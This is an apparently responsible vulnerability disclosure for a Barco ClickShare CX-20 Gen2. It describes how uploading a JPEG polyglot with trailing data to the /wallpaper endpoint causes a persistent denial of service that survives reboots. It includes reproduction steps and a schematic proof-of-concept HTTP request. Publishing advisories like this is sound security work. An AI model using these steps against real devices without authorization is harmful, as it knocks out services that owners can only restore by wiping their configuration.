# Barco001 - DoS via Polyglot Attack

## Vulnerability Information

| Field | Details |
|---|---|
| **Vendor** | Barco |
| **Product** | ClickShare CX-20 Gen2 |
| **Platform** | C3010S |
| **Model** | R9861612EU |
| **Firmware** | 02.26.00.0007 (latest as of August 2026) |
| **Endpoint** | /wallpaper |
| **Class** | Denial of Service |
| **CWE** | CWE-20 (Improper Input Validation) |
| **CWE** | CWE-703 (Improper Check or Handling of Exceptional Conditions) |
| **CVSS v3.1** | 8.2 (High) |
| **CVSS Vector** | AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H |

---

## Description

A vulnerability in the wallpaper upload functionality of Barco ClickShare CX-20 Gen2 (Platform: C3010S, Model: R9861612EU, Firmware: 02.26.00.0007) allows an authenticated attacker with default credentials to cause a persistent denial of service condition via a crafted polyglot JPEG file with trailing data uploaded to the /wallpaper endpoint. The device fails to properly validate file content beyond magic bytes (FFD8FFE0), causing an unhandled server exception (HTTP 500) that corrupts persistent storage.

**Device 1:** The /wallpaper endpoint returns a persistent HTTP 500 error. All other web UI endpoints remain accessible. The broken state survives device reboots and requires a full factory settings reset to recover.

**Device 2:** The entire HTTPS service (port 443) became completely unreachable following the upload. No endpoints were accessible from any client or browser. The exact causal relationship has not been conclusively confirmed, however no other changes were made during the session and no firewall or network-level block was identified.

---

## Steps to Reproduce

1. Access `https://<device-ip>/wallpaper` with valid credentials
2. Upload a polyglot JPEG file containing trailing data after EOI marker (FFD9)
3. Observe HTTP 500 Internal Server Error response
4. Attempt to access `/wallpaper` again — persistent HTTP 500 returned
5. Reboot device — issue persists after reboot
6. Only full factory settings reset restores functionality

---

## Impact

- **Minimum:** Complete and persistent unavailability of the /wallpaper endpoint
- **Maximum:** Entire HTTPS service (port 443) unreachable across all endpoints
- Recovery requires full factory settings reset — wiping all device configuration
- Confirmed on latest available firmware as of August 2026

---

## Proof of Concept

### Request
```http
POST /wallpaper HTTP/2
Host: <device-ip>
Content-Type: multipart/form-data; boundary=----Boundary
Cookie: PHPSESSID=<valid-session>

------Boundary
Content-Disposition: form-data; name="wallpaper"; filename="polyglot.jpg"
Content-Type: image/jpeg

[FFD8FFE0 - Valid JPEG magic bytes]
[JPEG image data]
[FFD9 - EOI marker]
[Trailing data appended after EOI]
------Boundary--
```

### Response
```http
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=UTF-8
Cache-Control: no-store, no-cache, must-revalidate
```

---

## Timeline

| Date | Event |
|---|---|
| August 2026 | Vulnerability discovered |
| August 2026 | Vendor notified via psirt@barco.com |
| August 2026 | Submitted to VulDB for CVE assignment |

---

## Vendor

- **Name:** Barco NV
- **Website:** https://www.barco.com
- **Security Contact:** psirt@barco.com

---

## Researcher

- Discovered during authorized security assessment
- Reported in accordance with responsible disclosure policy (90-day timeline)
